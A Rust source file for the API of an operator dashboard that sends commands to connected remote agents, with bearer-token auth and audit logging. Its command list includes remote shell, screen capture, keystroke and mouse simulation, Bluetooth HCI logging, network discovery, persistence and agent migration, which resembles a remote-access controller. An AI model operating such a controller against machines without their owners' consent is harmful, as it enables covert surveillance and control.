//! REST + WebSocket API for the operator dashboard.

use crate::auth::{require_bearer, AuthenticatedUser};
use crate::state::{now_secs, AgentView, AppState};
use axum::{
    extract::{
        ws::{Message as WsMessage, WebSocket, WebSocketUpgrade},
        Extension, Path, State,
    },
    http::StatusCode,
    middleware,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use common::{Command, Message, Outcome};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::oneshot;
use tower_http::services::ServeDir;

#[derive(Deserialize)]
pub struct CommandRequest {
    pub command: Command,
}

#[derive(Serialize)]
pub struct CommandReply {
    pub task_id: String,
    pub outcome: &'static str,
    pub output: Option<String>,
    pub error: Option<String>,
}

pub fn router(state: Arc<AppState>, static_dir: std::path::PathBuf) -> Router {
    // Routes that require the standard `Authorization: Bearer <token>` header.
    let api_authed = Router::new()
        .route("/agents", get(list_agents))
        // Route by reported agent_id (most-recently-seen wins when duplicates exist).
        .route("/agents/:id/command", post(send_command_by_agent_id))
        // Unambiguous routing by server-assigned connection_id.
        .route(
            "/connections/:id/command",
            post(send_command_by_connection_id),
        )
        .route("/audit", get(recent_audit))
        .route_layer(middleware::from_fn_with_state(
            state.clone(),
            require_bearer,
        ))
        .with_state(state.clone());

    // The WebSocket endpoint authenticates inside the handler because
    // browsers cannot set custom headers on WebSocket upgrade requests;
    // the token is carried in the `Sec-WebSocket-Protocol` header.
    let api = api_authed.route("/ws", get(ws_handler).with_state(state.clone()));

    Router::new()
        .nest("/api", api)
        .fallback_service(ServeDir::new(static_dir).append_index_html_on_directories(true))
}

async fn list_agents(State(state): State<Arc<AppState>>) -> Json<Vec<AgentView>> {
    Json(state.list_agents())
}

async fn recent_audit(State(state): State<Arc<AppState>>) -> Json<Vec<common::AuditEvent>> {
    Json(state.audit.recent(200))
}

async fn send_command_by_agent_id(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(agent_id): Path<String>,
    Json(req): Json<CommandRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
    dispatch_command(state, user, entry, req).await
}

async fn send_command_by_connection_id(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(connection_id): Path<String>,
    Json(req): Json<CommandRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state.find_by_connection_id(&connection_id).ok_or((
        StatusCode::NOT_FOUND,
        "no agent with that connection_id".into(),
    ))?;
    dispatch_command(state, user, entry, req).await
}

async fn dispatch_command(
    state: Arc<AppState>,
    user: AuthenticatedUser,
    entry: crate::state::AgentEntry,
    req: CommandRequest,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    // Use the reported agent_id for audit and response labelling.
    let agent_id = entry.agent_id.clone();

    let task_id = uuid::Uuid::new_v4().to_string();
    let (tx, rx) = oneshot::channel();
    state.pending.insert(task_id.clone(), tx);

    let cmd_label = command_label(&req.command);
    let cmd_detail = serde_json::to_string(&req.command).unwrap_or_default();

    let request = Message::TaskRequest {
        task_id: task_id.clone(),
        command: req.command,
        operator_id: Some(user.0.clone()),
    };

    if entry.tx.send(request).await.is_err() {
        state.pending.remove(&task_id);
        state
            .audit
            .record_simple(&agent_id, &user.0, cmd_label, &cmd_detail, Outcome::Failure);
        return Err((StatusCode::BAD_GATEWAY, "agent disconnected".into()));
    }

    let timeout = Duration::from_secs(state.command_timeout_secs);
    let result = tokio::time::timeout(timeout, rx).await;

    match result {
        Ok(Ok(Ok(output))) => {
            state
                .audit
                .record_simple(&agent_id, &user.0, cmd_label, &cmd_detail, Outcome::Success);
            Ok(Json(CommandReply {
                task_id,
                outcome: "ok",
                output: Some(output),
                error: None,
            }))
        }
        Ok(Ok(Err(err))) => {
            state
                .audit
                .record_simple(&agent_id, &user.0, cmd_label, &cmd_detail, Outcome::Failure);
            Ok(Json(CommandReply {
                task_id,
                outcome: "error",
                output: None,
                error: Some(err),
            }))
        }
        Ok(Err(_canceled)) => {
            state.pending.remove(&task_id);
            Err((
                StatusCode::INTERNAL_SERVER_ERROR,
                "response channel closed".into(),
            ))
        }
        Err(_elapsed) => {
            state.pending.remove(&task_id);
            state.audit.record_simple(
                &agent_id,
                &user.0,
                cmd_label,
                &format!("{cmd_detail} [timeout]"),
                Outcome::Failure,
            );
            Err((
                StatusCode::GATEWAY_TIMEOUT,
                "agent did not respond in time".into(),
            ))
        }
    }
}

fn command_label(c: &Command) -> &'static str {
    match c {
        Command::Ping => "Ping",
        Command::GetSystemInfo => "GetSystemInfo",
        Command::RunApprovedScript { .. } => "RunApprovedScript",
        Command::ListDirectory { .. } => "ListDirectory",
        Command::ReadFile { .. } => "ReadFile",
        Command::WriteFile { .. } => "WriteFile",
        Command::DeployModule { .. } => "DeployModule",
        Command::ExecutePlugin { .. } => "ExecutePlugin",
        Command::StartShell => "StartShell",
        Command::ShellInput { .. } => "ShellInput",
        Command::ShellOutput { .. } => "ShellOutput",
        Command::Shutdown => "Shutdown",
        Command::DiscoverNetwork => "DiscoverNetwork",
        Command::CaptureScreen => "CaptureScreen",
        Command::SimulateKey { .. } => "SimulateKey",
        Command::SimulateMouse { .. } => "SimulateMouse",
        Command::StartHciLogging => "StartHciLogging",
        Command::StopHciLogging => "StopHciLogging",
        Command::GetHciLogBuffer => "GetHciLogBuffer",
        Command::ReloadConfig => "ReloadConfig",
        Command::EnablePersistence => "EnablePersistence",
        Command::DisablePersistence => "DisablePersistence",
        Command::MigrateAgent { .. } => "MigrateAgent",
        Command::ListProcesses => "ListProcesses",
    }
}

async fn ws_handler(
    ws: WebSocketUpgrade,
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> axum::response::Response {
    // Browsers can't attach `Authorization` to a WebSocket handshake,
    // so the dashboard sends the bearer token as a subprotocol value
    // of the form `bearer.<token>`. Validate it here in constant time
    // before accepting the upgrade.
    let presented = headers
        .get(axum::http::header::SEC_WEBSOCKET_PROTOCOL)
        .and_then(|v| v.to_str().ok())
        .and_then(extract_bearer_subprotocol);

    let token = match presented {
        Some(t) => t,
        None => return (StatusCode::UNAUTHORIZED, "missing bearer subprotocol").into_response(),
    };

    use subtle::ConstantTimeEq;
    let ok: bool = token.as_bytes().ct_eq(state.admin_token.as_bytes()).into();
    if !ok {
        return (StatusCode::UNAUTHORIZED, "invalid token").into_response();
    }

    // Echo the chosen subprotocol back so the browser accepts the
    // upgrade (otherwise the handshake fails).
    let subprotocol = format!("bearer.{}", token);
    ws.protocols([subprotocol])
        .on_upgrade(move |sock| ws_loop(sock, state))
}

fn extract_bearer_subprotocol(header: &str) -> Option<String> {
    header
        .split(',')
        .map(str::trim)
        .find_map(|p| p.strip_prefix("bearer.").map(|t| t.to_string()))
}

#[derive(Serialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
enum DashboardEvent {
    Agents { agents: Vec<AgentView>, ts: u64 },
    Audit { event: common::AuditEvent },
}

async fn ws_loop(mut socket: WebSocket, state: Arc<AppState>) {
    let mut audit_rx = state.audit.subscribe();
    let mut tick = tokio::time::interval(Duration::from_secs(2));
    // Send an initial snapshot.
    if send_snapshot(&mut socket, &state).await.is_err() {
        return;
    }
    loop {
        tokio::select! {
            _ = tick.tick() => {
                if send_snapshot(&mut socket, &state).await.is_err() { break; }
            }
            ev = audit_rx.recv() => {
                match ev {
                    Ok(event) => {
                        let payload = DashboardEvent::Audit { event };
                        if let Ok(text) = serde_json::to_string(&payload) {
                            if socket.send(WsMessage::Text(text)).await.is_err() { break; }
                        }
                    }
                    Err(tokio::sync::broadcast::error::RecvError::Lagged(_)) => continue,
                    Err(_) => break,
                }
            }
            incoming = socket.recv() => {
                match incoming {
                    Some(Ok(WsMessage::Close(_))) | None => break,
                    Some(Ok(_)) => continue,
                    Some(Err(_)) => break,
                }
            }
        }
    }
}

async fn send_snapshot(socket: &mut WebSocket, state: &AppState) -> Result<(), axum::Error> {
    let payload = DashboardEvent::Agents {
        agents: state.list_agents(),
        ts: now_secs(),
    };
    let text = serde_json::to_string(&payload).unwrap_or_else(|_| "{}".into());
    socket.send(WsMessage::Text(text)).await
}
